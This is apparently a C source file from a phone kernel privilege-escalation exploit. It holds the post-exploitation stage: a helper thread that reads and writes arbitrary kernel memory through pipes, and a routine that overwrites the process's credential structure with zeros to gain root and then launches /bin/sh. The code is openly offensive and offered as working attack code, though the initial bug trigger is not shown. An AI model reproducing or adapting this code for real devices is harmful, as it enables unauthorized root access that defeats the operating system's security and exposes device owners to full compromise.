// Obtains root permissions on the phone

#include <stdatomic.h>
#include <unistd.h>
#include "exploit.h"
#include "util.h"

#define STATUS_FREE 0
#define STATUS_POSTING 1
#define STATUS_POST_WORK 2
#define STATUS_BUSY 3

void post_status(KReadWriteInfo *info, u32 status) {
    atomic_thread_fence(memory_order_seq_cst);
    info->status = status;
}

void await_status(KReadWriteInfo *info, u32 old_status, u32 new_status) {
    u32 val = old_status;
    do {
        val = old_status;
    } while (!atomic_compare_exchange_strong(&info->status, &val, new_status));
}

void read_write_thread(LocalCtx *ctx) {
    KReadWriteInfo *rw = &ctx->kread_write;

    for(;;) {
        await_status(rw, STATUS_POST_WORK, STATUS_BUSY);

        switch (rw->op) {
            case Read: {
                SYSCHK(write(rw->write_pipe, (void *) rw->addr, rw->size));
            } break;
            case Write: {
                SYSCHK(read(rw->read_pipe, (void *) rw->addr, rw->size));
            } break;
            default:
                break;
        }

        post_status(rw, STATUS_FREE);
    }
}

void send_work(LocalCtx *ctx, KReadWriteOp op, u64 address, usize size) {
    KReadWriteInfo *rw = &ctx->kread_write;

    await_status(rw, STATUS_FREE, STATUS_POSTING);

    rw->op = op;
    rw->addr = address;
    rw->size = size;

    post_status(rw, STATUS_POST_WORK);
}

static void kread(LocalCtx *ctx, u64 address, u8 *buffer, usize size) {
    send_work(ctx, Read, address, size);
    SYSCHK(read(ctx->kread_write.read_pipe, buffer, size));
}

static u64 read_u64(LocalCtx *ctx, u64 address) {
    u64 data = 0;
    kread(ctx, address, (u8 *) &data, sizeof(data));
    return data;
}

static void kwrite(LocalCtx *ctx, u64 address, u8 *buffer, usize size) {
    SYSCHK(write(ctx->kread_write.write_pipe, buffer, size));
    send_work(ctx, Write, address, size);
}

void rooter_thread(LocalCtx *ctx, u64 task_address, u64 creds_address) {
    // set all groups and users to 0
    u32 zeros[8] = { 0 };
    kwrite(ctx, creds_address, (u8 *) zeros, sizeof(zeros));

    execlp("/bin/sh", "/bin/sh", NULL);

    for (;;) {}
}